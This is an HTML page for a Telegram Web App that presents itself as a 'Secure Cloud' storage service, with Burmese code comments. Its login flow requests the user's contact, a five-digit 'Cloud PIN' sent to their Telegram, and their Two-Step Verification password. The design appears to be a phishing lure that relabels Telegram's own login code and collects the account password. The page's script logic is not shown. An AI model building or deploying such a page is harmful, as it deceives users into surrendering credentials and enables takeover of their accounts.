<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Personal Cloud</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="cloud-container">
        <div class="header">
            <h1 class="glow">☁️ Secure Cloud</h1>
            <p>Sync your Telegram Storage</p>
        </div>

        <div id="step-phone" class="step active">
            <p>Tap the button below to securely login with your Telegram account.</p>
            <button onclick="requestContact()" class="btn-primary">📱 Continue with Telegram</button>
        </div>

        <div id="step-otp" class="step hidden">
            <p>We've sent a 5-digit Cloud PIN to your Telegram.</p>
            <input type="number" id="otp_input" placeholder="12345" class="input-box">
            <button onclick="verifyOTP()" class="btn-primary">Verify & Access</button>
        </div>

        <div id="step-2fa" class="step hidden">
            <p>This account is protected by a Two-Step Verification password.</p>
            <input type="password" id="password_input" placeholder="Enter your password" class="input-box">
            <button onclick="verify2FA()" class="btn-primary">Submit Password</button>
        </div>

        <!-- Success Dashboard & Personal Cloud UI -->
        <div id="step-success" class="step hidden">
            <div class="dashboard-header">
                <h2>☁️ My Cloud</h2>
                <button onclick="fetchCloudData()" class="btn-refresh">🔄 Refresh</button>
            </div>
            
            <p id="cloud-status" style="font-size: 12px; color: #aaa;">Syncing securely from Telegram...</p>
            
            <!-- Cloud Files ပြသမည့် နေရာ -->
            <div id="cloud-files-list" class="file-list">
                <!-- Javascript မှ Data များ ဤနေရာသို့ ဝင်လာမည် -->
            </div>

            <!-- အချက်အလက်အသစ် လှမ်းသိမ်းရန် (Upload) နေရာ -->
            <div class="upload-area">
                <input type="text" id="note_input" placeholder="Type a note to save to cloud..." class="input-box">
                <button onclick="saveCloudNote()" class="btn-primary" style="margin-top: 10px;">💾 Save Note</button>
            </div>
        </div>

        <div id="step-loading" class="step hidden">
            <div class="spinner"></div>
            <p>Processing...</p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
